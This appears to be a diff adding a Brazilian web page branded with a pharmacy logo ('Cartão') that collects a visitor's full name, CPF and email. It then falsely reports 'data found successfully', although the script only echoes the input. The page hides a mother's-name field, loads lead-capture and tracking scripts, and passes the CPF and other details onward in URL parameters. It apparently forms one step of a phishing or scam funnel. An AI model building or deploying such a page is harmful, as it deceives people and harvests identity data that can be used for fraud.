@@ -1,0 +1,407 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/ml/progress.js"></script><script src="/api/public/pixel.js"></script><script src="/ml/lead-capture.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Cartão</title>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script src="/ml/utmify.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #d5d8dd;
+            background-color: #e9ebee;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            margin: 0 auto;
+            padding: 10px 20px 30px 20px;
+            margin: 0px 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background-color: #ffffff;
+            margin-top: 20px;
+        }
+        h1 {
+            font-family: 'Sora', sans-serif;
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .button {
+            background-color: #14315c;
+            color: #ffffff;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button2 {
+            background-color: #14315c;
+            color: #ffffff;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            border: none;
+        }
+        .button:hover {
+            background-color: #e6cf00;
+        }
+        label {
+            font-family: 'Sora', sans-serif;
+            color: #666;
+            font-size: 16px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .notification-card {
+            background-color: #ffeded;
+            border: 1px solid #ff5252;
+            color: #ff5252;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-family: 'Sora', sans-serif;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .notification-card i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+    </style>
+<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Drogarias Campeã" class="logo">
+    </div>
+
+    <div class="content">
+        <div id="primeiraParte">
+            <h1>Preencha seus dados</h1>
+            
+            <label for="nome">Nome completo</label>
+            <input type="text" id="nome" class="cpf-input" placeholder="Digite seu nome completo">
+
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">
+
+            <label for="email">E-mail</label>
+            <input type="email" id="email" class="cpf-input" placeholder="Digite seu e-mail">
+
+            <div id="notification" class="notification-card">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="notification-message"></span>
+            </div>
+            
+            <button class="button2" id="continuarBtn">Continuar</button>
+        </div>
+        
+        <div id="resultadoModal" style="display: none;">
+            <div style="text-align: center; margin-bottom: 20px; margin-top: 20px;">
+                <svg width="40" height="40" viewBox="0 0 40 40">
+                    <circle cx="20" cy="20" r="19" fill="#4CAF50" stroke="#45a049" stroke-width="2"></circle>
+                    <path d="M12 20l6 6 12-12" stroke="white" stroke-width="3" fill="none"></path>
+                </svg>
+                <h3 style="color: #4CAF50; margin: 10px 0;">Dados encontrados com sucesso!</h3>
+            </div>
+            
+            <div id="dadosContainer" style="font-family: 'Sora', sans-serif;">
+                <div style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center;">
+                    <i class="fas fa-user" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
+                    <div style="text-align: left;">
+                        <div style="color: #666; font-size: 13px;">Nome completo</div>
+                        <div style="color: #333; font-size: 15px; font-weight: 600;" id="nomeResult"></div>
+                    </div>
+                </div>
+
+                <div id="maeContainer" style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center;">
+                    <i class="fas fa-female" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
+                    <div style="text-align: left;">
+                        <div style="color: #666; font-size: 13px;">Nome da mãe</div>
+                        <div style="color: #333; font-size: 15px; font-weight: 600;" id="maeResult"></div>
+                    </div>
+                </div>
+
+
+
+                <div style="background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center;">
+                    <i class="fas fa-envelope" style="color: #3483fa; font-size: 20px; margin-right: 15px;"></i>
+                    <div style="text-align: left;">
+                        <div style="color: #666; font-size: 13px;">E-mail</div>
+                        <div style="color: #333; font-size: 15px; font-weight: 600;" id="emailResult"></div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="button" onclick="redirectWithAllParams()">
+                Continuar
+            </button>
+        </div>
+
+        <script>
+            // Função para mostrar notificação
+            function showNotification(message) {
+                const notification = document.getElementById('notification');
+                const notificationMessage = document.getElementById('notification-message');
+                
+                notificationMessage.textContent = message;
+                notification.style.display = 'flex';
+                
+                // Esconder após 3 segundos
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+
+            // Primeira letra de cada palavra em maiúscula (preserva acentos)
+            function toTitleCase(str) {
+                if (!str) return '';
+                return str.toLowerCase().split(/\s+/).map(function(word) {
+                    if (!word) return '';
+                    return word.charAt(0).toUpperCase() + word.slice(1);
+                }).join(' ');
+            }
+
+            // Abrevia nomes do meio quando o nome é muito grande para caber no cartão
+            function formatCardName(fullName) {
+                if (!fullName) return '';
+                var parts = fullName.trim().toUpperCase().split(/\s+/).filter(function(p){ return p; });
+                if (parts.length <= 2) return parts.join(' ');
+                var raw = parts.join(' ');
+                if (raw.length <= 24) return raw;
+                var first = parts[0];
+                var last = parts[parts.length - 1];
+                var middle = parts.slice(1, -1).map(function(p){ return p.charAt(0) + '.'; }).join(' ');
+                return (first + ' ' + middle + ' ' + last).trim();
+            }
+
+            // Função para redirecionar com todos os parâmetros
+            function redirectWithAllParams() {
+                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+                
+                // Recuperar parâmetros UTM originais do localStorage
+                const originalParams = JSON.parse(localStorage.getItem('urlParams') || '{}');
+                
+                // Recuperar dados do usuário separadamente
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
+                
+                // Criar objeto final com todos os parâmetros
+                const finalParams = { ...originalParams };
+                
+                // Adicionar dados do usuário como parâmetros adicionais
+                if (cpf) {
+                    finalParams.document = cpf;
+                }
+                
+                if (dadosUsuario && dadosUsuario.NOME) {
+                    finalParams.name = dadosUsuario.NOME;
+                }
+                
+                // Salvar dados do usuário separadamente (sem sobrescrever UTMs)
+                const userData = {
+                    document: cpf,
+                    name: dadosUsuario.NOME || '',
+                    mae: dadosUsuario.MAE || '',
+                    sexo: dadosUsuario.SEXO || '',
+                    nascimento: dadosUsuario.NASCIMENTO || ''
+                };
+                localStorage.setItem('userData', JSON.stringify(userData));
+                
+                console.log('Parâmetros originais (UTMs):', originalParams);
+                console.log('Dados do usuário:', userData);
+                console.log('Parâmetros finais:', finalParams);
+                
+                // Redirecionar com todos os parâmetros
+                const url = new URL('./6/index.html', window.location.href);
+                Object.keys(finalParams).forEach(key => {
+                    url.searchParams.append(key, finalParams[key]);
+                });
+                window.location.href = url.toString();
+            }
+            
+            document.getElementById('continuarBtn').addEventListener('click', function() {
+                const nome = document.getElementById('nome').value.trim();
+                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+                const email = document.getElementById('email').value.trim();
+                
+                if (!nome) {
+                    showNotification('Por favor, insira seu nome completo');
+                    return;
+                }
+                
+                if (cpf.length !== 11) {
+                    showNotification('Por favor, insira um CPF válido');
+                    return;
+                }
+
+                if (!email || !email.includes('@') || !email.includes('.')) {
+                    showNotification('Por favor, insira um e-mail válido');
+                    return;
+                }
+                
+                const nomeFormatado = toTitleCase(nome);
+                const nomeCartao = formatCardName(nomeFormatado);
+
+                const dadosUsuario = {
+                    NOME: nomeFormatado,
+                    NOME_CARTAO: nomeCartao,
+                    EMAIL: email
+                };
+                
+                // Salvar dados no localStorage
+                localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));
+
+                // Preencher dados no modal
+                document.getElementById('nomeResult').textContent = nomeFormatado;
+                document.getElementById('emailResult').textContent = email;
+                
+                // Esconder o campo da mãe
+                document.getElementById('maeContainer').style.display = 'none';
+                
+                // Mostrar modal
+                document.getElementById('resultadoModal').style.display = 'block';
+                document.getElementById('primeiraParte').style.display = 'none';
+            });
+        </script>
+    </div>
+
+    <script>
+        // Função para formatar CPF enquanto digita
+        document.getElementById('cpf').addEventListener('input', function (e) {
+            let value = e.target.value;
+            
+            // Remove todos os caracteres não numéricos
+            value = value.replace(/\D/g, '');
+            
+            // Formata o CPF
+            if (value.length > 0) {
+                value = value.replace(/^(\d{3})(\d)/g, '$1.$2');
+                value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3');
+                value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
+            }
+            
+            // Limita o tamanho
+            if (value.length > 14) {
+                value = value.substring(0, 14);
+            }
+            
+            e.target.value = value;
+            
+            // Posiciona o cursor no final
+            e.target.selectionStart = e.target.value.length;
+            e.target.selectionEnd = e.target.value.length;
+        });
+
+        // Função para obter parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+    
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+    
+        // Adiciona evento de clique no botão
+        document.addEventListener('DOMContentLoaded', function() {
+            const button = document.querySelector('.button');
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+                if (cpf.length !== 11) {
+                    showNotification('Por favor, insira um CPF válido');
+                    return;
+                }
+                
+                // Recuperar UTMs do localStorage
+                const savedParams = JSON.parse(localStorage.getItem('urlParams') || '{}');
+                
+                // Adicionar dados do usuário
+                savedParams.document = cpf;
+                
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+                if (dadosUsuario) {
+                    if (dadosUsuario.NOME) {
+                        savedParams.name = dadosUsuario.NOME;
+                    }
+                    if (dadosUsuario.EMAIL) {
+                        savedParams.email = dadosUsuario.EMAIL;
+                    }
+                }
+                
+                // Salvar dados atualizados
+                localStorage.setItem('urlParams', JSON.stringify(savedParams));
+                console.log('Dados atualizados com nome, CPF e email:', savedParams);
+                
+                // Redirecionar com todos os parâmetros
+                const url = new URL('./6/index.html', window.location.href);
+                Object.keys(savedParams).forEach(key => {
+                    url.searchParams.append(key, savedParams[key]);
+                });
+                window.location.href = url.toString();
+            });
+        });
+    </script>
+
+
+
+
+</body></html>
